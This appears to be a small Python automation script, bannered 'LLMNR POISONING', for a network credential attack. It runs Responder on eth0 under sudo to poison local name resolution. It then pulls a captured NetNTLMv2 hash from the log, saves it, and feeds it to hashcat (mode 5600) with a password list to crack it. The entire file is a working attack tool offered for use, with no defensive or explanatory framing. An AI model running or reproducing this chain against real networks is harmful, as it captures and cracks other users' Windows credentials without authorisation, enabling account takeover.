import re
import subprocess
import time

def print_ascii_art():
    # ASCII art for visual appeal
    print("""
ooooo        ooo        ooooo ooooo      ooo ooooooooo.        ooooooooo.     .oooooo.   ooooo  .oooooo..o   .oooooo.   ooooo      ooo ooooo ooooo      ooo   .oooooo
`888'        `88.       .888' `888b.     `8' `888   `Y88.      `888   `Y88.  d8P'  `Y8b  `888' d8P'    `Y8  d8P'  `Y8b  `888b.     `8' `888' `888b.     `8'  d8P'  `Y8b
 888          888b     d'888   8 `88b.    8   888   .d88'       888   .d88' 888      888  888  Y88bo.      888      888  8 `88b.    8   888   8 `88b.    8  888
 888          8 Y88. .P  888   8   `88b.  8   888ooo88P'        888ooo88P'  888      888  888   `"Y8888o.  888      888  8   `88b.  8   888   8   `88b.  8  888
 888          8  `888'   888   8     `88b.8   888`88b.          888         888      888  888       `"Y88b 888      888  8     `88b.8   888   8     `88b.8  888     ooooo
 888       o  8    Y     888   8       `888   888  `88b.        888         `88b    d88'  888  oo     .d8P `88b    d88'  8       `888   888   8       `888  `88.    .88'
o888ooooood8 o8o        o888o o8o        `8  o888o  o888o      o888o         `Y8bood8P'  o888o 8""88888P'   `Y8bood8P'  o8o        `8  o888o o8o        `8   `Y8bood8P
                                                                                                                                                                          """)

def get_user_input():
    while True:
        try:
            timeout = int(input("Enter the timeout value (in seconds): "))
            return timeout
        except ValueError:
            print("Please enter a valid number.")

def run_responder(timeout):
    try:
        command = f"sudo timeout {timeout} script -c 'sudo responder -I eth0 -dwPv' output.log"
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        if e.returncode == 124:  # specific error code for timeout
            print("The script has reached the specified timeout period", timeout , "seconds.")
        else:
            print("An unexpected error occurred.")
    except Exception as e:
        print("A general error occurred.")

def extract_hash():
    try:
        with open("output.log", "r") as log_file:   
            log_content = log_file.read()
        hash_value = re.search(r"Hash\s+:\s*(.*)", log_content)
        return hash_value.group(1).strip() if hash_value else None
    except FileNotFoundError:
        print("Log file not found.")
    except Exception as e:
        print(f"An error occurred while extracting the hash: {e}")

def write_hash_to_file(hash_value):
    try:
        with open("hash.txt", "w") as hash_file:
            hash_file.write(hash_value)
    except Exception as e:
        print(f"Error writing hash to file: {e}")

def clean_ansi_codes(text):
    return re.sub(r'\x1b\[[0-9;]*[mK]', '', text)

def main():
    print_ascii_art()
    timeout = get_user_input()
    run_responder(timeout)

    obtained_hash = extract_hash()
    if obtained_hash:
        print("Obtained hash:")
        print(obtained_hash)
        
        clean_hash = clean_ansi_codes(obtained_hash)
        write_hash_to_file(clean_hash)

        time.sleep(5)
        subprocess.run(f"hashcat -m 5600 ./hash.txt ./passwords.txt", shell=True)
    else:
        print("No hash was extracted.")

if __name__ == "__main__":
    main()
